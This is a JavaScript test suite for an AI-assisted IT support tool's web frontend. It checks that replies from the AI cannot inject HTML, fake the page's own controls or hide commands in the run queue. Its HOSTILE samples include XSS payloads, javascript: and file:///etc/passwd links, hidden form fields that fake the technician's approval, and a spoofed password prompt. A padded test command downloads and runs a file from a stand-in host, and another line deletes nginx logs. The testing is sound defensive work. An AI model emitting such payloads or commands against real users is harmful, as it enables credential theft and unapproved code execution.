"use strict";
// The frontend in a stand-in page (fakedom.cjs), fed Engine snapshots (tests/test_frontend.py).

const { test, afterEach } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const { loadApp, Event, WEB } = require("./fakedom.cjs");

if (!process.env.DAT_STATES) throw new Error("Run through pytest (tests/test_frontend.py), or set DAT_STATES to a file of snapshots.");
const STATES = JSON.parse(fs.readFileSync(process.env.DAT_STATES, "utf8"));
const state = (key, change) => {
  const s = structuredClone(STATES[key]);
  return change ? change(s) || s : s;
};
const PHOTO = "data:image/jpeg;base64,/9j/AAAA";
const plain = (x) => JSON.parse(JSON.stringify(x));     // a value of the page's realm, comparable here

const unhandled = [];
process.on("unhandledRejection", (e) => { unhandled.push(e); });
afterEach(() => { assert.deepEqual(unhandled.splice(0).map(String), [], "a promise was rejected with nobody to handle it"); });

// A page that has connected and been sent its first snapshot.
async function page(key = "a", change, routes = {}) {
  const app = loadApp();
  Object.assign(app.routes, routes);
  await app.event({ type: "state", state: state(key, change) });
  return app;
}
const caseId = (key) => STATES[key].case.id;
const drafts = (app) => app.posts("/api/draft").map((c) => c.body);
const row = (app, num) => app.run(`S.rows.get(${num})`);
const button = (el, label) => el.querySelectorAll("button").find((b) => b.textContent === label);
// the same elements, compared by identity (deepEqual would walk the whole page)
const same = (a, b) => a.length === b.length && a.every((x, i) => x === b[i]);
const termSocket = (app, sid = "local") => app.sockets.find((s) => s.url.includes(`/ws/term/${sid}`));

test("the page starts against the real index.html: its case, terminal and queue", async () => {
  const app = await page("a");
  assert.equal(app.events().url, "ws://127.0.0.1:48599/ws/events?t=tok");
  assert.equal(app.historyUrl, "/");                          // the token is taken out of the address
  assert.match(app.$("#case-btn").textContent, /Case A/);
  assert.equal(app.terminals.length, 1);
  assert.equal(app.$("#queue-list").querySelectorAll(".qitem").length, 4);
});

test("the token handed on in the address's fragment, as the browser's launch page does, is taken and hidden", async () => {
  const app = loadApp({ token: "frag", inFragment: true });
  await app.event({ type: "state", state: state("a") });
  assert.equal(app.events().url, "ws://127.0.0.1:48599/ws/events?t=frag");
  assert.equal(app.historyUrl, "/");
  assert.equal(app.window.sessionStorage.getItem("dat-token"), "frag");
});

test("a browser the app opened exchanges its one-time code for the token, once, before anything else", async () => {
  const app = loadApp({ hash: "#c=onetime", routes: { "POST /api/launch": () => ({ token: "real" }) } });
  await app.clock.tick(0);
  assert.deepEqual(plain(app.posts("/api/launch")[0].body), { code: "onetime" });
  assert.equal(app.historyUrl, "/");                                     // the code is out of the address
  assert.equal(app.events().url, "ws://127.0.0.1:48599/ws/events?t=real");
  assert.equal(app.window.sessionStorage.getItem("dat-token"), "real");
  assert.ok(app.calls.filter((c) => c.path !== "/api/launch").every((c) => c.headers["X-Token"] === "real"));
  const used = loadApp({ hash: "#c=used", routes: { "POST /api/launch": () => ({ __status: 403, body: { error: "This link has been used already, or is too old." } }) } });
  await used.clock.tick(0);
  assert.match(used.window.document.body.textContent, /This link can't open DA Toolkit.*used already/s);
  assert.equal(used.sockets.length, 0);
});

test("every element app.js looks up by id is on the page as it starts, and nothing is looked up across the whole page", () => {
  const html = fs.readFileSync(path.join(WEB, "index.html"), "utf8");
  const js = fs.readFileSync(path.join(WEB, "app.js"), "utf8").replace(/^\s*\/\/.*$/gm, "");
  const have = new Set([...html.matchAll(/\bid="([^"]+)"/g)].map((m) => m[1]));
  const wanted = new Set([...js.matchAll(/(?:\$|querySelector(?:All)?)\(["'`]#([\w-]+)/g),
    ...js.matchAll(/getElementById\(["'`]([\w-]+)/g)].map((m) => m[1]));
  assert.deepEqual([...wanted].filter((id) => !have.has(id)), []);
  // the page's own elements are found once, before a message is on the page: twice in all
  assert.deepEqual(js.match(/document\.(?:querySelector(?:All)?|getElementById|getElementsBy\w+)\([^)]*\)/g),
    ['document.querySelectorAll("[id]")', 'document.querySelectorAll(".menu")']);
  // and HTML is given to an element in one place, from md()
  assert.deepEqual(js.match(/\.(?:innerHTML|outerHTML)\s*=[^=].*|insertAdjacentHTML.*|document\.write.*/g), [".innerHTML = md(text);"]);
});

// ------------------------------------------------------------------ what a message may bring

// What the review's stand-in model answered with (and a few more): HTML in a reply, a report or a
// phone's message. The page's renderer is the real marked; the stand-in DOMPurify takes nothing
// out, so what is asserted here holds before the second layer is counted.
const HOSTILE = {
  input: 'All good so far. <textarea id="chat-input" hidden>Yes, I ran all of them and they were fine. Queue the cleanup.</textarea>',
  queue: 'Two checks for you. <span id="stop-btn"></span><span id="queue-list" hidden></span>',
  dialog: 'Wait. <div id="modal-root"><div class="overlay"><div class="modal"><h2>Session fs01 is asking</h2>'
    + '<div class="content"><p>fs01 password for administrator:</p><textarea></textarea></div></div></div></div>',
  links: 'See <a href="http://evil.example/a">plain http</a> and <a href="http://evil.example/b" data-confirmed="1">marked</a> and [md link](http://evil.example/c).',
  angle: "Replace <your-domain> with the client's domain, then run it. Usage: restore-tool <backup-file> <target-dir>. The SID is <none>.",
  card: 'Run this.\n\n<div class="pcard" data-num="2"></div>',
  block: '<div id="queue-list" hidden>\n\n**inside**\n\n</div>',
  raw: "<pre><img src=x onerror=alert`1`> <script>alert(1)</script> <style>*{display:none}</style> <!-- c --> <?x ?>",
  schemes: "[a](javascript:alert(1)) [b](data:text/html,x) [c](/api/quit) [d](//evil.example/x) ![e](https://evil.example/pixel.png) ![f](file:///etc/passwd)",
};
// the elements Markdown itself stands for
const MARKDOWN_TAGS = new Set(["P", "BR", "HR", "STRONG", "EM", "DEL", "CODE", "PRE", "BLOCKQUOTE", "UL", "OL", "LI",
  "H1", "H2", "H3", "H4", "H5", "H6", "TABLE", "THEAD", "TBODY", "TR", "TH", "TD", "A"]);

test("HTML written in a message is shown as typed: the renderer makes no element of it", async () => {
  const app = await page("a");
  for (const [name, text] of Object.entries(HOSTILE)) {
    const html = app.call("md", text);
    // every "<" the renderer wrote opens or closes an element of Markdown's own
    for (const m of html.matchAll(/<\/?([a-zA-Z][\w-]*)|</g)) assert.ok(m[1] && MARKDOWN_TAGS.has(m[1].toUpperCase()), `${name}: ${html}`);
    const el = app.call("rendered", text);
    for (const node of el.querySelectorAll("*")) {
      assert.ok(MARKDOWN_TAGS.has(node.tagName), `${name}: <${node.localName}>`);
      const attrs = node.attributes.map((a) => a.name).filter((a) => !["href", "title", "target", "rel", "data-insecure"].includes(a));
      assert.deepEqual(attrs, [], `${name}: <${node.localName}>`);
    }
    assert.deepEqual(el.querySelectorAll("[id], [class], [hidden], [data-num], [data-confirmed], textarea, span, div"), [], name);
  }
  // as typed, to the letter
  assert.equal(app.call("rendered", HOSTILE.angle).textContent.trim(), HOSTILE.angle);
  assert.equal(app.call("rendered", HOSTILE.input).textContent.trim(), HOSTILE.input);
  assert.match(app.call("rendered", HOSTILE.dialog).textContent, /<div id="modal-root"><div class="overlay">/);
  // a link is an http(s) or mailto address written as Markdown, and nothing else; an image is a link to it
  const links = (text) => app.call("rendered", text).querySelectorAll("a").map((a) => a.getAttribute("href"));
  assert.deepEqual(links(HOSTILE.schemes), ["https://evil.example/pixel.png"]);
  assert.equal(app.call("rendered", HOSTILE.schemes).textContent.trim(), "a b c d e f");
  assert.deepEqual(links("[kb](https://example.com/kb?a=1&b=2 \"the \\\"KB\\\"\") <https://example.org/> mail a@b.example"),
    ["https://example.com/kb?a=1&b=2", "https://example.org/", "mailto:a@b.example"]);
  // Markdown is still Markdown
  const doc = app.call("rendered", "# Title\n\n1. one\n2. two\n\n- [ ] todo\n- [x] done\n\n| a | b |\n|---|:-:|\n| 1 | 2 |\n\n```sh\nls <dir> && echo \"x\"\n```\n\n> **bold** *em* ~~gone~~ `code <b>`\nnext line");
  assert.deepEqual(["h1", "ol", "ul", "table", "pre", "blockquote", "strong", "em", "del", "br"].filter((t) => !doc.querySelector(t)), []);
  assert.equal(doc.querySelector("pre").textContent, 'ls <dir> && echo "x"\n');
  assert.deepEqual(doc.querySelectorAll("ul li").map((li) => li.textContent.trim()), ["☐ todo", "☑ done"]);
  assert.equal(doc.querySelector("td[align]").getAttribute("align"), "center");
});

test("the sanitiser is told to keep Markdown's elements only: no ids, classes, names, data attributes or form controls", async () => {
  const app = await page("a");
  app.call("md", "x");
  const o = app.window.DOMPurify.options;
  assert.deepEqual([...o.ALLOWED_TAGS].map((t) => t.toUpperCase()).sort(), [...MARKDOWN_TAGS].sort());
  assert.deepEqual([...o.ALLOWED_ATTR].sort(), ["align", "href", "start", "title"]);
  assert.equal(o.ALLOW_DATA_ATTR, false);
  assert.equal(o.ALLOW_ARIA_ATTR, false);
  for (const attr of ["id", "class", "name", "for", "hidden", "style"]) assert.ok(o.FORBID_ATTR.includes(attr), attr);
  for (const tag of ["textarea", "select", "option", "dialog", "label", "fieldset", "marquee", "map", "area", "img", "form", "input", "button", "iframe", "style"]) {
    assert.ok(o.FORBID_TAGS.includes(tag), tag);
  }
  assert.ok(!o.ALLOWED_URI_REGEXP.test("javascript:alert(1)") && o.ALLOWED_URI_REGEXP.test("https://example.com/"));
});

test("a reply that writes the page's own ids takes nothing over: the chat box, the queue, Stop and the dialogs stay the page's", async () => {
  const hostile = Object.values(HOSTILE).map((text) => ({ kind: "assistant", text, model: "m" }));
  const app = await page("a", (s) => {
    s.chat = [...hostile, { kind: "user", text: HOSTILE.input, via: "phone" },
      { kind: "assistant", text: "A report.", research: [{ id: "r1", task: "research", status: "done", brief: "b", searches: 1, pages: 1, steps: [], report: HOSTILE.dialog }] }];
    s.busy = true;
  }, { "POST /api/send": () => ({ ok: true }) });
  const doc = app.document;
  for (const id of ["chat-input", "queue-list", "stop-btn", "modal-root"]) assert.equal(doc.querySelectorAll(`#${id}`).length, 1, id);
  assert.equal(doc.querySelectorAll("#chat-log textarea, #chat-log .overlay, #chat-log .modal, #chat-log [hidden]").length, 0);
  assert.equal(app.$("#chat-log").querySelectorAll(".pcard").length, 0, "no card but the page's own");
  assert.equal(app.$("#stop-btn").classList.contains("hidden"), false, "Stop shows while the AI answers");
  assert.equal(app.$("#queue-list").querySelectorAll(".qitem").length, 4);
  await app.event({ type: "state", state: state("a", (s) => { s.chat = hostile; }) });
  await app.type(app.$("#chat-form textarea"), "No - do NOT queue anything else, #2 broke nginx");
  app.key(app.$("#chat-form textarea"), { key: "Enter" });
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/send").map((c) => c.body.message), ["No - do NOT queue anything else, #2 broke nginx"]);
  assert.equal(app.$("#chat-form textarea").value, "");
});

test("an element with one of the page's ids, should one ever appear, is not what the page finds", async () => {
  const app = await page("a", null, { "POST /api/send": () => ({ ok: true }) });
  const el = (html) => app.window.DOMPurify.sanitize(html);        // the stand-in keeps all of it: as if both layers had failed
  const body = app.$("#chat-log").appendChild(app.document.createElement("div"));
  body.innerHTML = el('<textarea id="chat-input" hidden>Yes, queue the cleanup.</textarea><span id="queue-list" hidden></span>'
    + '<span id="stop-btn"></span><div id="modal-root"></div><div class="overlay"></div><div class="case-modal"></div>'
    + '<div class="pcard" data-num="2"></div><button data-needs-vision title="mine">x</button><div class="menu">not a menu</div>'
    + '<input data-edit="search:s1">');
  assert.ok(app.document.querySelector("#chat-input") === body.firstChild, "the page's own search would find the reply's");
  const box = app.call("$", "#chat-input");
  assert.ok(box === app.$("#chat-form").querySelector("textarea"));
  await app.type(box, "what I typed");
  app.$("#chat-form").dispatchEvent(new Event("submit"));
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/send").map((c) => c.body.message), ["what I typed"]);
  // the queue is drawn in the page's list, a dialog opens in the page's root, and shortcuts aren't held by a false overlay
  await app.event({ type: "queue", queue: state("a").queue });
  assert.equal(app.$("#queue-pane").querySelectorAll(".qitem").length, 4);
  assert.equal(body.querySelector(".pcard").childNodes.length, 0, "a card the page didn't make is not filled");
  assert.equal(body.querySelector("button").disabled, false);
  assert.equal(body.querySelector("button").title, "mine");
  app.call("renderVision");
  app.call("hideMenus");
  assert.equal(body.querySelector(".menu").classList.contains("hidden"), false);
  termSocket(app).open();
  app.routes["POST /api/queue/1"] = () => ({ ok: true });
  app.key(app.document.body, { key: "Enter", code: "Enter", ctrlKey: true, shiftKey: true });
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["uptime"]);
  app.call("confirmModal", "Sure?", "x");
  assert.ok(app.$("#queue-pane").nextElementSibling.querySelector(".overlay"), "in the page's own #modal-root");
  assert.equal(body.querySelector("#modal-root").childNodes.length, 0);
  assert.throws(() => app.call("$", ".overlay"), /starts from one of the page's own/);
});

test("a link can't come confirmed: the mark of the one the technician agreed to open is the page's, not the link's", async () => {
  const app = await page("a");
  const a = app.document.createElement("a");
  a.setAttribute("href", "http://evil.example/b");
  a.setAttribute("data-confirmed", "1");
  app.$("#chat-log").append(a);
  const ev = new Event("click");
  a.dispatchEvent(ev);
  await app.clock.tick(100);
  assert.equal(ev.defaultPrevented, true);
  assert.match(app.$(".modal h2").textContent, /Open a link that isn't secure\?/);
  // a rendered reply's plain-http link is marked and asks, written as HTML or as Markdown
  const body = app.call("rendered", HOSTILE.links);
  assert.deepEqual(body.querySelectorAll("a").map((x) => [x.hasAttribute("data-insecure"), x.hasAttribute("data-confirmed"), x.getAttribute("target")]),
    body.querySelectorAll("a").map(() => [true, false, "_blank"]));
});

// ------------------------------------------------------------------ the chat box's draft

test("a case's draft is in the chat box when the case opens, and is saved there as it's typed", async () => {
  const app = await page("a", null, { "GET /api/draft": () => ({ text: "half a message", images: [PHOTO] }) });
  const box = app.$("#chat-input");
  assert.equal(box.value, "half a message");
  assert.equal(app.$("#attachments").querySelectorAll("img").length, 1);
  assert.equal(app.$("#attachments").classList.contains("hidden"), false);
  await app.clock.tick(2000);
  assert.deepEqual(drafts(app), [], "a draft just loaded isn't saved straight back");
  await app.type(box, "half a message, now finished");
  await app.clock.tick(799);
  assert.deepEqual(drafts(app), []);
  await app.clock.tick(1);
  assert.deepEqual(drafts(app), [{ case_id: caseId("a"), text: "half a message, now finished", images: [PHOTO] }]);
});

test("opening another case saves what was typed to its own case and shows the other's draft", async () => {
  const app = await page("a", null, {
    "GET /api/draft": (c) => (c.query.case_id === caseId("b") ? { text: "about B", images: [] } : { text: "", images: [PHOTO] }),
  });
  await app.type(app.$("#chat-input"), "about A");
  // what the page keeps per case: a terminal's output markers and the image cache
  const marker = app.run(`const m = S.terms.local.term.registerMarker(0); S.terms.local.markers.set(1, m); imageCache.set("img-1", "blob:fake/9"); m`);
  await app.event({ type: "state", state: state("b") });
  assert.deepEqual(drafts(app), [{ case_id: caseId("a"), text: "about A", images: [PHOTO] }]);
  const order = app.calls.filter((c) => c.path === "/api/draft").map((c) => `${c.method} ${c.query.case_id || c.body.case_id}`);
  assert.deepEqual(order.slice(-2), [`POST ${caseId("a")}`, `GET ${caseId("b")}`], "saved before the next case's is shown");
  assert.equal(app.$("#chat-input").value, "about B");
  assert.equal(app.run("pendingImages.length"), 0);
  assert.equal(app.$("#attachments").classList.contains("hidden"), true);
  assert.equal(marker.isDisposed, true);
  assert.equal(app.run("S.terms.local.markers.size"), 0);
  assert.equal(app.run("imageCache.size"), 0);
  assert.deepEqual(app.revoked, ["blob:fake/9"]);
  await app.clock.tick(2000);
  assert.equal(drafts(app).length, 1, "B's draft, just shown, isn't saved again");
});

test("what was typed before any case existed stays in the box for the first case", async () => {
  const app = await page("none");
  await app.type(app.$("#chat-input"), "VPN drops every hour");
  await app.clock.tick(2000);
  assert.deepEqual(drafts(app), [], "no case to keep it in yet");
  await app.event({ type: "state", state: state("a") });
  assert.equal(app.$("#chat-input").value, "VPN drops every hour");
  assert.deepEqual(drafts(app), [{ case_id: caseId("a"), text: "VPN drops every hour", images: [] }]);
  assert.deepEqual(app.gets("/api/draft"), [], "not replaced by the case's saved one");
});

test("a draft that arrives after yet another case opened is not shown", async () => {
  let releaseB;
  const app = await page("a", null, {
    "GET /api/draft": (c) => (c.query.case_id === caseId("b") ? new Promise((r) => { releaseB = () => r({ text: "about B", images: [] }); })
      : c.query.case_id === caseId("c") ? { text: "about C", images: [] } : { text: "", images: [] }),
  });
  await app.event({ type: "state", state: state("b") });
  await app.event({ type: "state", state: state("c") });
  assert.equal(app.$("#chat-input").value, "about C");
  releaseB();
  await app.clock.tick(0);
  assert.equal(app.$("#chat-input").value, "about C");
});

test("another case's unsent text is never left in the box: it is emptied before the new case's draft is fetched, even if that fails", async () => {
  const app = await page("a", null, { "POST /api/send": () => ({ ok: true }),
    "GET /api/draft": (c) => (c.query.case_id === caseId("b") ? { __status: 500, body: { error: "The draft file can't be read." } } : { text: "", images: [] }) });
  const box = app.$("#chat-input");
  await app.type(box, "the first thing I asked about A");
  app.$("#chat-form").dispatchEvent(new Event("submit"));
  await app.clock.tick(0);
  await app.type(box, "the admin password for A's firewall is");
  app.run(`pendingImages.push(${JSON.stringify(PHOTO)}); renderAttachments()`);
  await app.event({ type: "state", state: state("b") });
  assert.equal(box.value, "", "not A's words, in B's box");
  assert.equal(app.run("pendingImages.length"), 0);
  assert.match(app.toasts().at(-1), /This case's unsent message couldn't be fetched: The draft file can't be read\./);
  assert.deepEqual(drafts(app).at(-1), { case_id: caseId("a"), text: "the admin password for A's firewall is", images: [PHOTO] }, "kept with its own case");
  // ↑ recalls the open case's messages, not the last one's
  assert.equal(app.key(box, { key: "ArrowUp" }).defaultPrevented, false);
  assert.equal(box.value, "");
  // typing that starts before the draft arrives is not overwritten by it
  const held = app.hold("GET /api/draft", { text: "C's old draft", images: [] });
  await app.event({ type: "state", state: state("c") });
  await app.type(box, "new words for C");
  await held.release();
  assert.equal(box.value, "new words for C");
});

test("a draft is saved only after the save before it has been answered, each with the text of its own moment", async () => {
  const app = await page("a");
  const held = app.hold("POST /api/draft", { ok: true });
  const box = app.$("#chat-input");
  await app.type(box, "first");
  await app.clock.tick(800);
  await app.type(box, "first, then more");
  await app.clock.tick(800);
  await app.type(box, "first, then more, and the end");
  app.call("saveDraft").catch(() => {});
  await app.clock.tick(0);
  assert.deepEqual(held.calls.map((c) => c.body.text), ["first"], "one on its way; the others wait their turn");
  await held.release();
  assert.deepEqual(held.calls.map((c) => c.body.text), ["first", "first, then more", "first, then more, and the end"]);
});

test("Send results opens once however often it is asked for while it gathers the results", async () => {
  const app = await page("a", (s) => { Object.assign(s.queue[0], { status: "ran", ran_at: 1 }); },
    { "POST /api/preview": (c) => ({ items: c.body.texts.map((text) => ({ text, redactions: 0 })) }) });
  const held = app.hold("GET /api/queue/1/capture", { text: "up 3 days" });
  app.$("#send-results-btn").click();
  app.$("#chat-results-btn").click();
  await app.clock.tick(0);
  await app.call("openSendResults", { sid: "local", text: "pasted" });
  await held.release();
  await app.clock.tick(50);
  assert.equal(app.$("#modal-root").querySelectorAll(".modal").length, 1);
  assert.equal(app.toasts().filter((t) => /Send results is already open/.test(t)).length, 2);
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(0);
  app.$("#send-results-btn").click();                            // closed: it opens again
  await app.clock.tick(50);
  assert.equal(app.$("#modal-root").querySelectorAll(".modal").length, 1);
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(0);
  // gathering failed: not left "open" for ever
  app.routes["POST /api/preview"] = () => ({ __status: 500, body: { error: "The preview failed." } });
  app.$("#send-results-btn").click();
  await app.clock.tick(50);
  assert.match(app.toasts().at(-1), /The preview failed/);
  app.routes["POST /api/preview"] = (c) => ({ items: c.body.texts.map((text) => ({ text, redactions: 0 })) });
  app.$("#send-results-btn").click();
  await app.clock.tick(50);
  assert.equal(app.$("#modal-root").querySelectorAll(".modal").length, 1);
});

test("a button or a line that says it is busy says what happened when the request fails", async () => {
  const fails = (why) => () => ({ __status: 502, body: { error: why } });
  const app = await page("a", (s) => {
    Object.assign(s.queue[1], { risk: "disruptive", risk_reasons: ["restarts a service"] });
    s.config.hosts = [{ name: "fs01", kind: "ssh", host: "fs01.lan", user: "bob", auth: "password", has_password: true }];
  }, { "POST /api/queue/2/review": fails("The reviewer's provider is down."), "GET /api/search": fails("The index is being rebuilt."),
    "GET /api/models": fails("401 from the provider."), "POST /api/hosts/fs01/forget-password": () => ({ ok: true }) });
  termSocket(app).open();
  // "Get a second opinion" in the dialog before a disruptive command
  button(row(app, 2), "Run").click();
  await app.clock.tick(50);
  const ask = button(app.$(".modal"), "Get a second opinion");
  ask.click();
  await app.clock.tick(0);
  assert.equal(ask.disabled, false, "it can be asked again");
  assert.match(app.$(".modal .review").textContent, /The reviewer couldn't be asked: The reviewer's provider is down\./);
  app.routes["POST /api/queue/2/review"] = () => ({ model: "x/reviewer", different_model: true, text: "It restarts nginx." });
  ask.click();
  await app.clock.tick(0);
  assert.deepEqual([ask.disabled, ask.textContent], [false, "Ask again"]);
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(0);
  // "Searching…" in Similar past cases
  await app.call("openSimilar");
  await app.clock.tick(50);
  assert.equal(app.$(".modal .case-list").textContent, "The search didn't run: The index is being rebuilt.");
  button(app.$(".modal"), "Close").click();
  await app.clock.tick(0);
  // "Loading models…" in a provider's form
  app.call("openSettings");
  await app.clock.tick(50);
  button(app.$(".modal .list-item"), "Edit").click();
  button(app.$(".modal"), "Load the model list").click();
  await app.clock.tick(0);
  assert.doesNotMatch(app.$(".modal .content").textContent, /Loading models…/);
  assert.match(app.$(".modal .content").textContent, /✗ The model list couldn't be loaded: 401 from the provider\./);
  // "Forget stored password": the form says there is none now, and keeps what was typed into it
  app.$(".modal .tabs-inline").querySelectorAll("button").find((b) => b.textContent === "Hosts").click();
  await app.clock.tick(50);
  button(app.$(".modal .list-item"), "Edit").click();
  const user = app.$(".modal").querySelectorAll("input[type=text]").find((i) => i.value === "bob");
  await app.type(user, "alice");
  button(app.$(".modal"), "Forget stored password").click();
  await app.clock.tick(0);
  assert.equal(button(app.$(".modal"), "Forget stored password"), undefined);
  assert.match(app.$(".modal input[type=password]").placeholder, /Leave blank to be asked each time/);
  assert.equal(user.value, "alice");
});

test("a message sent leaves no draft behind in its case", async () => {
  const app = await page("a", null, { "POST /api/send": () => ({ ok: true }) });
  await app.type(app.$("#chat-input"), "check the disk");
  app.$("#chat-form").dispatchEvent(new Event("submit"));
  await app.clock.tick(2000);
  assert.deepEqual(app.posts("/api/send").map((c) => c.body), [{ message: "check the disk", images: [] }]);
  assert.deepEqual(drafts(app).at(-1), { case_id: caseId("a"), text: "", images: [] });
  assert.equal(app.$("#chat-input").value, "");
});

test("picking an answer to the AI's question puts one line in the reply, replacing an earlier pick", async () => {
  const app = await page("a");
  const box = app.$("#chat-input");
  box.value = "Some context";
  app.call("answerQuestion", "Which\n   host?", "web01", box);
  app.call("answerQuestion", "Which host?", "db01", box);
  assert.equal(box.value, "Some context\nQ: Which host? — db01");
  assert.ok(app.document.activeElement === box, "the focus is back in the chat box");
  assert.equal(box.selectionStart, box.value.length);
  await app.clock.tick(800);
  assert.equal(drafts(app).at(-1).text, "Some context\nQ: Which host? — db01");
});

// ------------------------------------------------------------------ the queue

test("a move steps past the items the queue doesn't show", async () => {
  const app = await page("a", (s) => { s.queue[1].status = "sent"; s.queue[2].status = "withdrawn"; });
  app.routes["POST /api/queue/1/move"] = app.routes["POST /api/queue/4/move"] = () => ({ ok: true });
  button(row(app, 1), "↓").click();
  button(row(app, 4), "↑").click();
  button(row(app, 4), "↓").click();                       // the last one shown: nothing to pass
  await app.clock.tick(0);
  assert.deepEqual(app.calls.filter((c) => c.path.endsWith("/move")).map((c) => [c.path, c.body.delta]),
    [["/api/queue/1/move", 3], ["/api/queue/4/move", -3]]);
  app.$("#show-done").checked = true;
  app.$("#show-done").dispatchEvent(new Event("change"));
  button(row(app, 1), "↓").click();
  await app.clock.tick(0);
  assert.deepEqual(app.calls.filter((c) => c.path.endsWith("/move")).at(-1).body, { delta: 1 });
});

test("a second click on Run while the first is under way types nothing more", async () => {
  const app = await page("a");
  termSocket(app).open();
  const held = app.hold("POST /api/queue/1", (c) => (c.body.command ? { item: { command: c.body.command } } : { ok: true }));
  row(app, 1).querySelector(".cmd").value = "uptime -p";       // edited, not saved yet
  button(row(app, 1), "Run").click();
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  assert.equal(held.calls.length, 1);
  await held.release();
  assert.deepEqual(held.calls.map((c) => c.body), [{ command: "uptime -p" }, { status: "ran" }]);
  assert.deepEqual(app.terminals[0].pasted, ["uptime -p"]);
  assert.equal(termSocket(app).sent.filter((m) => m === JSON.stringify({ type: "input", data: "\r" })).length, 1);
  assert.equal(app.run("S.running.size"), 0);
});

test("a held Ctrl+Shift+Enter runs one read-only command, not one per key repeat", async () => {
  const app = await page("a", null, { "POST /api/queue/1": () => ({ ok: true }) });
  termSocket(app).open();
  const keys = { key: "Enter", code: "Enter", ctrlKey: true, shiftKey: true };
  assert.equal(app.key(app.document.body, keys).defaultPrevented, true);
  await app.clock.tick(0);
  for (let i = 0; i < 5; i++) assert.equal(app.key(app.document.body, { ...keys, repeat: true }).defaultPrevented, true);
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/1").map((c) => c.body), [{ status: "ran" }]);
  assert.deepEqual(app.terminals[0].pasted, ["uptime"]);
});

test("Ctrl+Shift+Enter refuses a command that an edit made more than read-only", async () => {
  const app = await page("a", null, {
    "POST /api/queue/1": (c) => ({ item: { command: c.body.command, risk: "disruptive", risk_reasons: ["deletes files"] } }),
  });
  termSocket(app).open();
  row(app, 1).querySelector(".cmd").value = "rm -rf /var/log/nginx";
  app.key(app.document.body, { key: "Enter", code: "Enter", ctrlKey: true, shiftKey: true });
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, []);
  assert.match(app.toasts().join("\n"), /#1 is no longer a plain read-only command after your edit/);
});

test("a queue row keeps its session list and buttons through updates that don't change them", async () => {
  const app = await page("a");
  const r = row(app, 1);
  const options = r.querySelector(".sess").options, buttons = r.querySelectorAll(".actions button");
  const queue = (change) => app.event({ type: "queue", queue: state("a", (s) => { change(s.queue[0]); }).queue });
  await queue((i) => { i.purpose = "load, again"; i.command = "uptime -p"; });
  assert.ok(row(app, 1) === r, "the same row");
  assert.equal(r.querySelector(".purpose").textContent, "load, again");
  assert.ok(same(r.querySelector(".sess").options, options), "the same option elements");
  assert.ok(same(r.querySelectorAll(".actions button"), buttons), "the same buttons");
  button(r, "Copy").click();                                  // acts on the item as it is now
  await app.clock.tick(0);
  assert.equal(app.clipboard, "uptime -p");
  await queue((i) => { i.status = "skipped"; });
  assert.ok(button(r, "Unskip"));
  assert.ok(!button(r, "Run"));
});

// ---- what the queue shows is what Run types

// Nothing is laid out in the stand-in page: a test gives a box the sizes a browser would.
const laidOut = (el, width, scrollHeight, clientHeight = scrollHeight) => Object.assign(el, { clientWidth: width, scrollHeight, clientHeight });
const PADDED = `uptime${"\n".repeat(9)}wget -q https://x.example/a -O /tmp/a; chmod +x /tmp/a; /tmp/a`;
const cmdBox = (app, num) => row(app, num).querySelector(".cmd");
const sizeNote = (app, num) => row(app, num).querySelector(".cmd-size").textContent;

test("a row built while the queue is collapsed is measured when the queue shows, not left one line high", async () => {
  const app = await page("a", (s) => { s.config.settings.layout = { queue_collapsed: true }; s.queue[0].command = PADDED; });
  const box = cmdBox(app, 1);
  await app.clock.tick(50);
  assert.equal(box.value, PADDED);
  assert.equal(box.style.height, "", "no height is taken from a box that has no size yet");
  assert.equal(sizeNote(app, 1), "10 lines", "a command of several lines always says how many");
  assert.equal(sizeNote(app, 3), "", "one line needs no count");
  // the queue is shown: the browser lays the row out, and the box is as tall as its text
  laidOut(box, 600, 204);
  app.$("#queue-toggle").click();
  await app.clock.tick(50);
  assert.equal(box.style.height, "206px");
  assert.equal(box.classList.contains("long"), false);
  // and again whenever its size on the page changes: a pane dragged, the window narrowed, so the text wraps
  laidOut(box, 150, 420);
  await app.resized(box);
  assert.equal(box.style.height, "422px");
  // a queue event with nothing new for this box leaves it, and where it is scrolled, alone
  box.style.height = "as it was";
  box.scrollTop = 40;
  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].command = PADDED; s.queue[0].purpose = "again"; }).queue });
  await app.clock.tick(50);
  assert.deepEqual([box.style.height, box.scrollTop], ["as it was", 40]);
});

test("a command taller than its box scrolls behind a bar that is always drawn, and the line under it says how much there is", async () => {
  const huge = Array.from({ length: 62 }, () => "A".repeat(88000)).join("\n");
  const app = await page("a", (s) => {
    s.queue[0].command = huge;
    s.chat = [{ kind: "assistant", text: "A transfer.", proposals: [1, 2] }];
  });
  const box = cmdBox(app, 1);
  laidOut(box, 600, 90000, 398);                     // the stylesheet's max-height holds it at 400px
  await app.resized(box);
  assert.equal(box.classList.contains("long"), true);
  assert.equal(sizeNote(app, 1), "62 lines, 5.2 MB: scroll the box to read all of it");
  // the chat's card of the same item follows the same rule
  const [card, other] = app.$("#chat-log").querySelectorAll(".pcard");
  const shown = card.querySelector(".pcmd");
  await app.clock.tick(50);
  assert.equal(shown.textContent, huge);
  assert.equal(card.querySelector(".cmd-size").textContent, "62 lines, 5.2 MB");
  laidOut(shown, 300, 180000, 398);
  await app.resized(shown);
  assert.equal(shown.classList.contains("long"), true);
  assert.equal(card.querySelector(".cmd-size").textContent, "62 lines, 5.2 MB: scroll the box to read all of it");
  assert.equal(shown.getAttribute("tabindex"), "0", "a box that scrolls can be scrolled from the keyboard");
  assert.equal(other.querySelector(".pcmd").getAttribute("tabindex"), null);
  assert.ok(button(card, "Run"));
  assert.equal(other.querySelector(".cmd-size").textContent, "");
  // the card keeps its box through queue updates (and so where it is scrolled), and is measured again
  shown.scrollTop = 120;
  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].command = huge; s.queue[0].purpose = "transfer"; }).queue });
  assert.ok(card.querySelector(".pcmd") === shown);
  assert.equal(shown.scrollTop, 120);
